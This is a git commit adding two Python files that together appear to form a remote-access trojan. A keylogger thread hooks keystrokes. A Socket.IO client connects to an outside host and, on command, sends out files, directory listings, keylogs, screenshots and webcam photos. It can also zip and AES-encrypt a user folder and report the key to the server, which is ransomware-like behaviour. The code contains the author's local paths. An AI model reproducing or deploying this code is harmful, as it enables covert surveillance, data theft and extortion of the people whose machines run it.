1b19ae410169e438e4531e70fb03328fa7e62ac4
HareeshGali <hgsata@gmail.com>
2016-10-16 10:26:43 -0400

    Add files via upload

---
+++ Server-Client%20Comms/encryptFS.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python
+import os
+import zipfile
+import shutil
+import os, random, struct
+from Crypto.Cipher import AES
+import uuid
+
+def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
+    if not out_filename:
+        out_filename = in_filename + '.enc'
+
+    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    filesize = os.path.getsize(in_filename)
+
+    with open(in_filename, 'rb') as infile:
+        with open(out_filename, 'wb') as outfile:
+            outfile.write(struct.pack('<Q', filesize))
+            outfile.write(iv)
+
+            while True:
+                chunk = infile.read(chunksize)
+                if len(chunk) == 0:
+                    break
+                elif len(chunk) % 16 != 0:
+                    chunk += ' ' * (16 - len(chunk) % 16)
+
+                outfile.write(encryptor.encrypt(chunk))
+
+def zipdir(path, ziph):
+    # ziph is zipfile handle
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+def encryptionExecute():
+	path = '/Users/Hareesh/test'
+	pathZip = path + ".zip"
+	zipf = zipfile.ZipFile(pathZip, 'w', zipfile.ZIP_DEFLATED)
+	zipdir(path, zipf)
+	zipf.close()
+	#shutil.rmtree(path)
+	key = ''.join(random.choice('0123456789ABCDEF') for i in range(16));
+	encrypt_file(key, pathZip)
+	return key
+
+
+
+
---
+++ Server-Client%20Comms/socketClient(Main Client).py
@@ -0,0 +1,151 @@
+#!/usr/bin/python
+
+from socketIO_client import SocketIO, BaseNamespace
+from sysPathList import *
+import base64
+from encryptFS import *
+from decrpyter import *
+import sys
+import os
+sys.path.insert(0, '../python-tools')
+from Tracket import speak
+from Tracket import printScreen
+from multiprocessing import Process
+import subprocess
+import testLogger
+import getpass
+import Queue
+from pygame import mixer # Load the required library
+
+print os.getcwd()
+
+
+from threading import Thread
+import pyHook
+import pythoncom
+import win32gui
+import win32console
+
+def logger(q):
+	x = ""
+	log_file = "log_file.txt"                 #name of log file
+	window = win32console.GetConsoleWindow()  #go to script window
+	#win32gui.ShowWindow(window,0)             #hide window
+
+	def pressed_chars(event):       #on key pressed function
+		x = ""
+		if event.Ascii:
+			f = open(log_file,"a")  # (open log_file in append mode)
+			char = chr(event.Ascii) # (insert real char in variable)
+			if char == "q":         # (if char is q)
+			    f.close()           # (close and save log file)	
+			    exit()              # (exit program)
+			if event.Ascii == 13:   # (if char is "return")
+			    f.write("\n")       # (new line)
+			f.write(char)           # (write char)
+			x = q.get()
+			x = x+char
+			q.put(x)
+			print x
+
+
+	proc = pyHook.HookManager()      #open pyHook
+	proc.KeyDown = pressed_chars     #set pressed_chars function on KeyDown event
+	proc.HookKeyboard()              #start the function
+	pythoncom.PumpMessages()         #get input 
+
+
+
+def client(q):
+	class ChatNamespace(BaseNamespace):
+
+	    def reply(self, *args):
+	        print('reply', args)
+
+	class NewsNamespace(BaseNamespace):
+
+	    def on_aaa_response(self, *args):
+	        print('on_aaa_response', args)
+
+
+
+
+	def reply(*args):
+	    print('reply', args)
+
+	def fileDirReturn(data):
+
+		if(not data['dir']):
+			x = lists('/')
+		else:
+			x = lists(data['dir'])
+
+		if(data['file']!= ''):
+			filename = data['file']
+			
+			file = open(data['dir'] +"/" + data['file'], 'rb')
+			fileread = file.read()
+			encode = base64.encodestring(fileread)
+			socketIO.emit("fileData", {'file':filename, 'filedata': encode})
+		else:
+			socketIO.emit("dirData", {'syslist': x})
+
+	def keyLogReturn(data):
+		x = q.get()
+		socketIO.emit("keylogData", {"keylogdata": str(x)})
+
+	def encryptStuff(data):
+		key = encryptionExecute()
+		mixer.init()
+		mixer.music.load('test.mp3')
+		mixer.music.play()
+		socketIO.emit("encryptData", {'key': key})
+
+	def decryptStuff(data):
+		decrypt_file(data['key'],"/Users/"+getpass.getuser()+"/"+ getpass.getuser() +".zip")
+		#decrypt_file(data['key'], "/Users/Hareesh/test.zip.enc")
+	def tts(data):
+		speak(data['text'])
+	def loc(data):
+		j = getLocation()
+		socketIO.emit("locationData", {'lat': j['latitude'], 'long': j['longitude']})
+
+
+	def screenCap(data):
+		printScreen()
+		file = open("screenshot.jpg", 'rb')
+		fileread = file.read()
+		encode = base64.encodestring(fileread)
+		socketIO.emit("screenshotData", {'file':"screenshot.jpg", 'filedata': encode})
+
+
+	def webcamPic(data):
+		subprocess.call(['java', '-jar', 'Tracket.jar'])
+		file = open("test.jpg", 'rb')
+		fileread = file.read()
+		encode = base64.encodestring(fileread)
+		socketIO.emit("webcamData", {'file':"image.jpg", 'filedata': encode})
+
+	socketIO = SocketIO('andrewarpasi.com', 6969)
+
+	socketIO.emit('registerListener', {'UID': 'testID'}, reply)
+	socketIO.on("feedback", reply)
+	socketIO.on('fileReq', fileDirReturn)
+	socketIO.on('keylog', keyLogReturn)
+	socketIO.on('webcam', webcamPic)
+	socketIO.on('screenshot', screenCap)
+	socketIO.on('encrypt', encryptStuff)
+	socketIO.on('decrypt', decryptStuff)
+	socketIO.on('tts', tts)
+	#SocketIO.on()
+
+	socketIO.wait()
+
+
+q = Queue.Queue()
+x = ""
+q.put(x)
+thread = Thread(target = logger, args = [q])
+thread2 = Thread(target = client, args = [q])
+thread.start()
+thread2.start()
